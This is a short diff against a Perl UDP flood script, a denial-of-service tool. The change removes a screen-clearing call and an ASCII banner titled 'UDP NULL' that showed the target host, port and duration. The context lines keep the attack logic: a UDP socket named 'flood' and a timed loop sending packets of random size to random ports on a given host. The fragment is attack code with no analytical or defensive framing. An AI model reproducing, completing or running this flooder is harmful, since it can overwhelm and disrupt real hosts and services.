@@ -8,21 +8,6 @@ $iaddr = inet_aton("$ip") or die "perl $0 <host> <Port> <Packet Size (1-65495)> 
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-$clear_string = `clear`;
-
-print $clear_string;
-
-print <<EOTEXT;
-██╗   ██╗██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗     ██╗     
-██║   ██║██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║     ██║     
-██║   ██║██║  ██║██████╔╝    ██╔██╗ ██║██║   ██║██║     ██║     
-██║   ██║██║  ██║██╔═══╝     ██║╚██╗██║██║   ██║██║     ██║     
-╚██████╔╝██████╔╝██║         ██║ ╚████║╚██████╔╝███████╗███████╗
- ╚═════╝ ╚═════╝ ╚═╝         ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝    
-              host: $ip port: $port time: $time
-EOTEXT
-;
-
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
